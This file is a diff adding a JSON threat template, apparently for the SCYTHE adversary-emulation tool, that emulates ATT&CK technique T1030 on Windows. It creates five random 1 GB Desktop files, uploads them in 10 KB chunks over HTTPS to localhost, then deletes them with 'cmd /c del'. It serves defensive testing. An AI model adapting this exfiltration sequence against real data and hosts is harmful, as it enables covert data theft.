@@ -1,0 +1,88 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "T1030-Data Transfer Limit Sizes",
+        "display_name": "T1030-Data Transfer Limit Sizes",
+        "name": "T1030-Data Transfer Limit Sizes",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\testfile.xls\" --size 1GB --count 5 --random",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\testfile.xls\"",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\testfile.xls2\"",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\testfile.xls3\"",
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\testfile.xls4\"",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\testfile.xls5\"",
+                "type": "message"
+            },
+            "9": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%USERPROFILE%\\Desktop\\testfile.xls*\"",
+                "type": "message"
+            },
+            "11": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
